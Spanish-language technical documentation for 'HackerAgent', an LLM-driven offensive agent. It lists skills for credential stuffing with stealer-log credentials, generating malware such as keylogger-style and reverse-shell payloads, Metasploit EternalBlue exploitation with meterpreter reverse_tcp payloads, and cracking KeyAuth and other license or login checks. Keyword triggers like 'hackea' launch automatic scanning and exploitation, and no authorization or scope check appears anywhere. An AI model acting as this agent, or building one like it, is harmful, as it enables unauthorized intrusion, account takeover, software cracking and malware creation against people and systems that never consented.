# HackerAgent — Documentación técnica

## Estructura del proyecto

```text
HackerAgent/
├── agent.py                        # Agente principal de pentesting
├── confs.json                      # Rutas y comandos de herramientas externas
├── .env                            # API keys y OLLAMA_URL
├── requirements.txt                # Dependencias Python (requests)
├── skills/
│   ├── __init__.py                 # Loader dinámico + run_skill() + skills_context()
│   ├── pentest_skils/
│   │   ├── crtsh_enum.py           # Certificate Transparency (crt.sh)
│   │   ├── cred_stuff.py           # Auditor de creds: lee expuestas, entiende login (HTML/JSON), veredicto bueno/malo
│   │   ├── gobuster_dir.py         # Gobuster con manejo wildcard 403
│   │   ├── google_dorks.py         # Google dorks de seguridad
│   │   ├── metasploit.py           # Metasploit: search/exploit/auxiliary/payload/scan
│   │   ├── nuclei_scan.py          # Nuclei con auto-detección de templates
│   │   ├── scan_red.py             # Nmap con clasificación de puertos críticos
│   │   ├── shodan_query.py         # Shodan API + InternetDB fallback
│   │   ├── spider_code.py          # Spider HTML/JS buscando secretos + source maps
│   │   ├── sqli_scan.py            # SQLi: sqlmap (detecta + extrae) + fallback manual
│   │   ├── subfinder_enum.py       # Subfinder + httpx verificación HTTP
│   │   ├── web_attack.py           # Pentest web dinámico: SQLi/XSS/LFI/redirect/cmdi
│   │   ├── web_code.py             # Análisis profundo de código fuente web (JS/CSS/Firebase)
│   │   ├── whiteintel.py           # Descarga credenciales filtradas (stealer logs)
│   │   └── wpscan_run.py           # WPScan con API key automática
│   ├── inginversa_skills/
│   │   └── agent_ing.py            # Skill RE + agente interactivo standalone
│   └── dev_skills/
│       ├── model_advisor.py        # Recomienda qué modelo Ollama usar por tarea
│       └── code_dev.py             # Desarrolla código (pentest/malware) con modelo local → out/<proj>/dev/
├── out/                            # out/<nombre_proyecto>/  (creado por picker)
└── out_re/                         # out_re/<binname>/  (ing_inversa standalone)
```

---

## Configuración

### .env

```ini
OLLAMA_URL=http://192.168.80.120:11434/api/chat
WPSCAN_API_KEY=...
SHODAN_API_KEY=...
VIRUSTOTAL_API_KEY=...
```

Modelos recomendados: `deepseek-r1:14b` (equilibrado) · `deepseek-r1:32b` (máxima calidad) · `dolphin-mistral:latest` (rápido)

---

## Sistema de Skills

### Loader (`skills/__init__.py`)

Carga módulos desde dos niveles usando `importlib.util.spec_from_file_location`:
1. `skills/*.py` — raíz
2. `skills/<subdir>/*.py` — subdirectorios (donde viven todos los skills actuales)

No requiere tocar `__init__.py` al agregar un skill nuevo.

### Categorías

```python
CATEGORY_LABELS = {
    "recon_pasivo": "🔍 RECONOCIMIENTO PASIVO",      # crtsh, google_dorks, shodan, subfinder, whiteintel
    "recon_activo": "⚡ RECONOCIMIENTO ACTIVO",       # gobuster, scan_red
    "vuln_scan":    "🎯 ESCANEO DE VULNERABILIDADES", # nuclei, wpscan, sqli_scan, web_attack
    "analisis":     "🔬 ANÁLISIS DE CÓDIGO",          # spider_code, web_code
    "ing_inversa":  "🔬 INGENIERÍA INVERSA",          # ing_inversa
    "ataque":       "💥 ATAQUE / EXPLOTACIÓN",        # metasploit, cred_stuff
    "desarrollo":   "🛠 DESARROLLO DE CÓDIGO / MALWARE", # model_advisor, code_dev
    "otros":        "⚙  OTROS",
}
```

### Sintaxis en `commands`

```
SKILL:crtsh_enum domain=example.com
SKILL:google_dorks domain=example.com dork_type=all
SKILL:subfinder_enum domain=example.com verify_http=true
SKILL:shodan_query target=example.com
SKILL:gobuster_dir target=https://example.com extensions=php,html,txt
SKILL:scan_red target=192.168.1.1 ports=top1000
SKILL:nuclei_scan target=https://example.com severity=critical,high
SKILL:wpscan_run target=https://example.com enumerate=vp,vt,u
SKILL:web_attack target=https://example.com tests=sqli,xss,lfi,redirect,cmdi
SKILL:sqli_scan target='https://example.com/item.php?id=1' dump=true
SKILL:sqli_scan target=https://example.com/login data="user=a&pass=b"
SKILL:whiteintel domain=example.com type=stealer scope=corporate limit=500
SKILL:cred_stuff target=https://example.com/login domain=example.com   # auto-baja creds de whiteintel
SKILL:cred_stuff target=https://example.com/login creds=/tmp/whiteintel_example.com_*/creds.txt
SKILL:cred_stuff target=https://example.com/api/login creds="user:pass;admin:1234"
SKILL:spider_code target=https://example.com
SKILL:web_code target=https://example.com
SKILL:web_code target=https://example.com max_files=50
SKILL:ing_inversa target=/ruta/al/binario
SKILL:model_advisor kind=malware
SKILL:code_dev request="reverse shell TCP con reconexión" kind=payload language=python
SKILL:code_dev request="keylogger sigiloso" kind=malware language=c model=dolphin-mistral:latest
SKILL:metasploit mode=search cve=CVE-2017-0144
SKILL:metasploit mode=exploit target=10.10.11.1 module=exploit/windows/smb/ms17_010_eternalblue lhost=10.10.14.1
SKILL:metasploit mode=scan target=192.168.1.0/24
SKILL:metasploit mode=payload lhost=10.10.14.1 payload=windows/x64/meterpreter/reverse_tcp output=/tmp/shell.exe
```

### Estructura de cada skill

```python
META = {
    "name":        "nombre_skill",
    "category":    "recon_pasivo",
    "description": "...",
    "args":        ["target", "..."],
    "example":     "SKILL:nombre_skill target=...",
}

def run(**kwargs) -> dict:
    return {
        "success":  bool,
        "output":   str,
        "findings": [
            {"type": "...", "value": "...", "severity": "critical|high|medium|low|info"}
        ],
    }
```

### Severidad de findings

| Skill | critical | high | medium | low | info |
|-------|----------|------|--------|-----|------|
| `nuclei_scan` | CVE crítico | CVE alto | CVE medio | — | tecnologías |
| `wpscan_run` | — | CVEs | plugins/temas | — | versiones |
| `shodan_query` | — | CVE expuesto | puerto riesgo | — | host info |
| `gobuster_dir` | — | — | `.env`,`.sql`,`.bak` | admin/login | paths |
| `scan_red` | puertos 23,6379,9200,27017 | 21,445,3306,3389 | puertos medios | — | host info |
| `metasploit` | session_opened / vuln_confirmed | CVE encontrado | smb_share/user | — | módulos encontrados |
| `sqli_scan` | sqli confirmado | database accesible | — | — | técnica/DBMS |
| `web_attack` | sqli / lfi / command_injection | xss reflejado | open_redirect | — | — |
| `whiteintel` | set user:pass filtrado | credencial individual / leaked_credential | — | — | — |
| `cred_stuff` | valid_credential (login OK) | — | — | — | — |
| `code_dev` | — | — | model_warning | — | code_generated |
| `model_advisor` | — | — | model_warning | — | model_recommendation |
| `spider_code` | credenciales/firebase/aws | api_keys | endpoints | internal_network | source maps |
| `web_code` | firebase_config / credential / source_map_exposed | firebase_collection / storage_ref | api_endpoint / websocket / env_vars | — | framework / librería / nav_route |
| `ing_inversa` | bypass exitoso / hardcoded_credential | función auth | bypass falló | NX/PIE | tipo binario / file_used |
| `crtsh_enum`, `subfinder_enum`, `google_dorks` | — | — | — | — | dominios/URLs |

### Agregar un nuevo skill

1. Crear `skills/<subdir>/mi_skill.py` con `META` y `run()`
2. Se carga automáticamente — no tocar `agent.py` ni `__init__.py`
3. Aparece en el system prompt del modelo agrupado por categoría

---

## agent.py — Agente principal

### Uso

```bash
python3 agent.py
python3 agent.py --model deepseek-r1:14b
python3 agent.py --session mi_sesion      # carga sesión legacy por nombre (salta picker)
python3 agent.py --list-sessions
python3 agent.py --no-wizard
```

### Flujo de inicio

```
python3 agent.py
    │
    ├─ pick_or_create_project()           # pantalla de proyectos
    │       ├─ Proyecto nuevo → pide nombre → out/<slug>/
    │       └─ Proyecto existente → lista sesiones → reanudar o nueva sesión
    │
    ├─ [si sesión reanudada] load_session_in_project() → conversación restaurada
    │
    └─ [si sesión nueva] ask_session_config() → wizard de configuración
           ├─ Paso 1: tipo de análisis (TASK_PROFILES)
           ├─ Paso 2: target, subdominios, reporte, sigilo, agresividad, use_subagents
           └─ Paso 3: selección de skills por número/categoría/nombre
```

### Picker de proyecto (`pick_or_create_project`)

Lista proyectos en `out/` con: nombre display, target, nº sesiones, resumen de severidad, fecha última sesión.

```
📁  PROYECTOS GUARDADOS
  1.  corp_auditoria_2026    example.com     3 sesiones  2026-07-01
      2 critical  5 high
  2.  ctf_hackthebox         10.10.11.1      7 sesiones  2026-06-30
   0.  [Crear nuevo proyecto]
```

Al elegir un proyecto existente muestra sus sesiones y ofrece reanudar una o iniciar una nueva.

### TASK_PROFILES

| # | Perfil | Categorías | Agresividad |
|---|--------|-----------|-------------|
| 1 | Pentesting web / Red Team | recon_pasivo, recon_activo, vuln_scan | 3 |
| 2 | Ingeniería inversa / Binarios | ing_inversa | 1 |
| 3 | OSINT / Recon pasivo | recon_pasivo | 1 |
| 4 | Escaneo de vulnerabilidades | vuln_scan, recon_activo | 3 |
| 5 | Análisis de código / Secretos | analisis | 2 |
| 6 | Full (todos los skills) | todos | 2 |

### Comandos interactivos

| Comando | Descripción |
|---------|-------------|
| `help` / `ayuda` / `?` | Muestra todo lo que el agente puede hacer (comandos, disparadores y skills por categoría) |
| `salir` / `exit` | Guarda sesión y sale |
| `cd <ruta>` | Cambia directorio de trabajo |
| `sesiones` | Lista sesiones guardadas |
| `sesion guardar <nombre>` | Guarda sesión con nombre |
| `sesion cargar <nombre>` | Carga sesión previa |
| `apikeys` | Muestra estado de API keys |
| `reporte` / `html` | Genera reporte HTML + Markdown |
| `listame vulnerabilidades` / `vulns` | Parsea log y lista vulns numeradas |
| `explotar <N>` | Crea PoC para la vulnerabilidad número N |

### Auto-pentest (`hackea/escanea <url>`)

Regex detecta: `hackea`, `escanea`, `pentest`, `audita`, `analiza`, `ataca`, `testea` + URL/dominio.

`run_pentest_phases()` ejecuta SIN LLM:
- **CRT.SH**: `SKILL:crtsh_enum`
- **Fase 1**: whois, dig, curl headers, Google dorks, Shodan InternetDB
- **Fase 2**: whatweb, wafw00f, robots.txt, sitemap.xml, subfinder
- **Fase 3**: spider secretos en HTML/JS, source maps, email harvest, comentarios

Detecta CMS → pasa a LLM con instrucciones de explotación (Fase 4-5).

### Auto-RE / bypass (`bypass/crackea/reversea/parchea …`)

`_RE_TRIGGER` detecta: `bypass`, `bypassea`, `crackea`, `reversea`, `revierte`, `parchea`,
`patchea`, `desbloquea`, `saltar`, `ingeniería inversa`. `_resolve_re_target()` saca la ruta
del mensaje (o usa el `cwd` si no hay ninguna) y ejecuta `SKILL:ing_inversa target=<ruta>` SIN LLM.

- Si el bypass se completa (existe `binfinal`) → imprime el archivo bypasseado + credenciales y termina el turno.
- Si queda parcial → pasa el análisis al LLM para que continúe con más técnicas (no se detiene).

Ejemplo: `bypass el login` en una carpeta → autodescubre el archivo del login, lo revierte y
devuelve la copia bypasseada + `run_bypass.sh`.

### Clases y funciones clave

| Símbolo | Línea aprox. | Descripción |
|---------|-------------|-------------|
| `CircuitBreaker` | 171 | Detecta sig = primeras 2 palabras, corta tras 3 repeticiones |
| `ScanCache` | 197 | Cache 24h en `scan_cache.json` |
| `SubAgent` | 238 | Agente ligero por tarea: contexto propio, hilo separado, resumen compacto |
| `LogWriter` | ~490 | Escribe `.md` en tiempo real |
| `ProjectState` | ~554 | Persistencia JSON: `domains` (set), `findings` (list), deduplicación |
| `pick_or_create_project()` | ~696 | Pantalla de selección/creación de proyecto |
| `list_project_sessions()` | ~730 | Lista sesiones de un proyecto concreto |
| `load_session_in_project()` | ~745 | Carga sesión desde directorio de proyecto |
| `TASK_PROFILES` | ~1430 | 6 perfiles de tarea |
| `ask_session_config()` | ~1510 | Wizard: acepta `prefill_project_name` |
| `generate_html_report()` | ~1760 | HTML dark theme con gráficos |
| `run_pentest_phases()` | ~1970 | 4 fases de recon sin LLM |
| `print_help()` | ~1385 | Ayuda completa (comandos + disparadores + skills por categoría) |
| `_RE_TRIGGER` / `_resolve_re_target()` | ~2005 | Disparador de RE + resolución del archivo/carpeta objetivo |
| `parse_skill_call()` | — | Detecta `SKILL:nombre k=v` → `(name, args_dict)` |
| `summarize_if_needed()` | — | Comprime conversación >22K chars |

### Arquitectura multi-agente (SubAgent)

Cuando `use_subagents: true` (default), cada skill lanza un `SubAgent` en hilo independiente:

```
Skill ejecutado (inline, rápido)
    │
    ├─ s_out, s_findings → ProjectState.ingest() / log
    │
    └─ SubAgent thread ──► Ollama (contexto propio, 4096 tokens)
                               │  system prompt: analista de seguridad
                               │  input: skill_name + target + output[:6000]
                               └─► {"summary", "key_findings", "next_step"}
                                        │
                                        ▼
                               all_output.append(compacto)
                               (agente principal recibe resumen, NO el raw output)
```

- Si hay 3 skills → 3 SubAgents analizan en paralelo
- Cada SubAgent tiene contexto propio — sin contaminación cruzada
- Si Ollama no responde → `{"summary": "[SubAgent error]"}` sin romper el flujo

**Salida en terminal:**
```
🎯 SKILL: nuclei_scan  {...}
  [output crudo...]
  └─ ✓ OK
🤖 SubAgent[nuclei_scan] lanzado (análisis en paralelo)

⏳ Esperando 1 SubAgent(s)...

┌─ SubAgent [nuclei_scan]
│  3 CVEs activos. Log4Shell confirmado en /api/log.
│  [CRITICAL] CVE-2021-44228 Log4Shell RCE en /api/log
│  [HIGH] CVE-2022-22965 Spring4Shell en /app
└─ ▶ Explotar con SKILL:metasploit mode=exploit
```

### ProjectState — persistencia entre sesiones

```python
project_state = ProjectState(target_dir, project_name=..., target=...)
# Tras cada skill:
new_doms = project_state.ingest_skill_findings(skill_name, s_findings)
project_state.save()  # → out/<proyecto>/project_state.json
```

`ingest_skill_findings()` extrae dominios de `subdomain_crt`, `subdomain`, `http_active`, `dork_url`.
`add_finding()` deduplica por `(type, value[:80])` mirando los últimos 200 findings.

### Ejecución de comandos (cada turno)

```
commands: ["SKILL:nuclei_scan ...", "curl -sI ...", "nmap ..."]
    │
    ├─ skill_cmds    → run_skill() → SubAgent.start() (paralelo)
    │                → ingest_skill_findings() → project_state.save()
    │                → SubAgent.join() → all_output.append(compacto)
    ├─ parallel_cmds (curl, dig, subfinder...) → run_commands_parallel()
    └─ sequential_cmds → run_command() con per-tool timeout
         ├─ wpscan → inyecta --api-token + --random-user-agent
         ├─ nuclei → nuclei_fix_template_paths() + inject_nuclei_json()
         └─ curl/httpx → verify_http_response() (SQLi/XSS/LFI/RCE determinístico)
```

### Salida en disco

```text
out/<nombre_proyecto>/
├── project_state.json                ← dominios, findings, sev_summary (persiste entre sesiones)
├── scan_cache.json                   ← TTL 24h por comando
├── session_YYYYMMDD_HHMMSS.json      ← conversación completa
├── session_YYYYMMDD_HHMMSS.md        ← log en tiempo real
├── session_YYYYMMDD_HHMMSS_report.md
└── session_YYYYMMDD_HHMMSS_report.html  ← dark theme con gráficos
```

### Formato JSON del modelo

```json
{
  "thinking":              "razonamiento interno",
  "commands":              ["SKILL:nuclei_scan target=<url>", "nmap -sV <ip>"],
  "message":               "texto plano en español para el usuario",
  "requires_confirmation": false,
  "task_complete":         false,
  "risk_level":            "low|medium|high|critical",
  "phase":                 "recon|scan|exploit|post-exploit|report",
  "install_needed":        [],
  "needs_api_keys":        [],
  "open_browser":          "",
  "fetch_url":             ""
}
```

---

## Skill: ing_inversa (`skills/inginversa_skills/agent_ing.py`)

Doble función:
1. **Skill** (`META` + `run()`) — invocable con `SKILL:ing_inversa target=/ruta`
2. **Agente standalone** (`main()`) — `python3 agent_ing.py --target /ruta`

`target` puede ser un **binario**, un **script** (bash/python/php/…) o un **directorio**
(autodescubre el objetivo con `_discover_target()`).

**Scripts** (`_script_flow()`): entiende el código fuente, extrae la contraseña embebida
(`_extract_creds()`), detecta qué archivos usa el script y lee sus secretos
(`_find_referenced_files()`), y genera una copia bypasseada neutralizando los condicionales
de auth (`_patch_bash()` / `_patch_generic()`) + `run_bypass.sh`.

**Binarios** — `run()` ejecuta sin LLM:
1. Análisis estático: file, strings, nm, checksec, readelf, compiler, r2_funcs
2. `_skill_detect_type()`: cython / pyinstaller / nuitka / golang / rust / elf_cmp / elf / pe / unknown
3. **`_source_recovery()` (PRIORIDAD)**: si junto al binario hay código fuente Python
   (`modules/`, `.git`, `*.py`), localiza el login (`_PY_AUTH_LINE`), lo parchea
   quirúrgicamente (`_neutralize_login`: flags de auth→True, `.login()`→pass,
   `while not logged_in`→`while False`) y genera `<main>_bypass.py` + `run_bypass.sh`.
   Es la vía más fiable para apps Cython/PyInstaller con KeyAuth. Solo si no hay fuente
   parcheable pasa al bypass a nivel binario (LD_PRELOAD / online / patch r2).
4. `_skill_apply_bypass()`:
   - cython / pyinstaller / elf_cmp / unknown → **LD_PRELOAD** (intercepta memcmp/strcmp)
   - elf/golang/rust con funciones auth → **r2 patch** (`wa ret`)
4. Crea `out_re/<bin>_<ts>/binfinal` + `run_bypass.sh`

### Detección de tipo

| Señal | Tipo | Técnica |
|-------|------|---------|
| `__pyx_*` en nm | cython | LD_PRELOAD |
| `MEIPASS` en strings | pyinstaller | LD_PRELOAD |
| `nuitka` en strings | nuitka | LD_PRELOAD |
| `go build` en strings | golang | r2 patch |
| `rustc` en strings | rust | r2 patch |
| ELF + `memcmp@GLIBC` / `strcmp@GLIBC` | elf_cmp | LD_PRELOAD |
| ELF sin lo anterior | elf | r2 patch si hay funcs auth, si no LD_PRELOAD |

### Mecanismo de auth: LOCAL vs ONLINE (`_detect_auth_mechanism()`)

Antes de aplicar el bypass, el skill distingue si el login es **local** (memcmp/strcmp →
LD_PRELOAD/r2) u **online** (KeyAuth, licencias, API HTTP). Para auth online el LD_PRELOAD
de memcmp **no sirve** (la decisión la toma el servidor). En ese caso `_apply_online_bypass()`
genera artefactos de bypass en runtime y devuelve `success=False` (no verificado):

| Señal en strings/nm | Mecanismo | Artefactos generados |
|---------------------|-----------|----------------------|
| `keyauth` / `keyauth.win` | `online_keyauth` | `frida_bypass.js` + `fake_keyauth.py` (redirige a localhost) + intento patch r2 |
| `requests`/`http`/`license`/`hwid`/`token` (≥2) | `online_generic` | `frida_bypass.js` + intento patch r2 |
| `memcmp@GLIBC` / `strcmp@GLIBC` | `local_cmp` | LD_PRELOAD (verificable) |

El agente reporta los artefactos y **no** afirma éxito hasta que se prueben en runtime.
IMPORTANTE: el LD_PRELOAD solo aplica si se ejecuta `run_bypass.sh`, no `./binfinal` directo.

---

## Problemas conocidos y soluciones

| Problema | Causa | Solución |
|----------|-------|----------|
| Skills no se cargaban | Loader solo escaneaba `skills/*.py` | `importlib.util.spec_from_file_location` + scan de subdirectorios |
| `AttributeError: 'list' object` en nuclei | nuclei `-json-export` escribe array en una línea | `isinstance(item, list)` → `.extend()` |
| CRT.SH timeout | `curl --max-time 10` insuficiente | `SKILL:crtsh_enum` en `run_pentest_phases()` |
| CVEs null en `listame vulnerabilidades` | Parser línea-a-línea fallaba | `re.finditer` sobre texto completo |
| `explotar N` con `searchsploit N/A` | Fallback literal `'N/A'` | Prioridad: CVE → componente → título |
| `SyntaxWarning: invalid escape` en Python 3.12 | `\|` en str no-raw | Cambiado a raw string |
| Bucle SHODAN_API_KEY infinito | Modelo pide key aunque esté disponible | `keys_requested_rounds > 3` → break |
| `BINPATH`/`OUTDIR` literales en comandos | Modelo copia placeholders del system prompt | Sustitución en Python antes de ejecutar |
| r2 timeout en binarios grandes | `aaa` sobre 10 MB tarda >5 min | timeout 300s en subprocess |
| nuclei `could not find template` | Paths relativos no encontrados | `find_nuclei_templates()` + `nuclei_fix_template_paths()` |
| gobuster 403 wildcard | Todos los paths devuelven 403 | `gobuster_dir` detecta wildcard y añade `--wildcard` |
| Modelo explica en vez de ejecutar | `task_complete: True` en JSON de error | Default `False` + push-back `empty_cmd_count` |
| Bucle infinito en agente RE | force-continue sin contexto | Análisis inicial sin LLM + `empty_count` counter |
| Proyectos mezclados por target | `out/<target>/` cambiaba con cada target | `pick_or_create_project()` → `out/<proyecto>/` fijo |
